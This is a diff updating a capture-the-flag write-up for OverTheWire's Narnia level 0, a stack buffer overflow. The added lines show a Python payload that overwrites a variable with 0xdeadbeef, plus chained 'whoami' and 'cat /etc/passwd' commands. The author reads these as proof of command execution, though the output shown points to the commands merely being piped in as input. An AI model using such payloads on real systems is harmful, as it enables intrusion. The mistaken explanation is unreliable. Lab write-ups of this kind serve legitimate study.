@@ -94,7 +94,7 @@ narnia.labs.overthewire.org
 >val: 0xefbeadde  
 >WAY OFF!!!!  
 >```
-> Our buffer shows that we inserted ```RRRRRRRRRRRRRRRRRRRRޭ�``` which we obviously wouldn't have been able to type in.  However, we forget about the little endian part and our value aren't in the correct order.  Let's fix that.
+> Our buffer shows that we inserted ```RRRRRRRRRRRRRRRRRRRRޭ�``` which we obviously wouldn't have been able to type in.  However, we forget about the little endian part and our values aren't in the correct order.  Let's fix that.
 >
 >```
 ># python -c 'print "R"*20+"\xef\xbe\xad\xde"' | ./narnia0  
@@ -103,4 +103,26 @@ narnia.labs.overthewire.org
 >val: 0xdeadbeef  
 >```
 >
-> Well, we didn't get the ```WAY OFF!!!``` message, but no shell. TODO
+> Well, we didn't get the ```WAY OFF!!!``` message, but no shell. I actually spent a good bit of time at this stage, but learned a few key concepts in doing so.  The shell is being launched, but the problem is it's exiting before we have a chance to run anything.  We can prove that by trying to concatenate a second command to run.
+> 
+>```
+># python -c 'print "R"*20+"\xef\xbe\xad\xde"';whoami | ./narnia0  
+>RRRRRRRRRRRRRRRRRRRRﾭ  
+>Correct val's value from 0x41414141 -> 0xdeadbeef!  
+>Here is your chance: buf: root  
+>val: 0x41414141  
+>WAY OFF!!!!  
+>```
+>
+> We can see that when it shows us what the buf looks like it shows ```root``` which is the result of the whoami command.  We can try a few other things too.
+>
+>```
+># python -c 'print "R"*20+"\xef\xbe\xad\xde"';cat /etc/passwd | ./narnia0  
+>RRRRRRRRRRRRRRRRRRRRﾭ  
+>Correct val's value from 0x41414141 -> 0xdeadbeef!  
+>Here is your chance: buf: root:x:0:0:root:/root:/b  
+>val: 0x622f3a74  
+>WAY OFF!!!!  
+>```
+>
+> Clearly we are able to run commands.  Up to now, I have been running this locally, so let's see if we can do this on the server and find the flag.
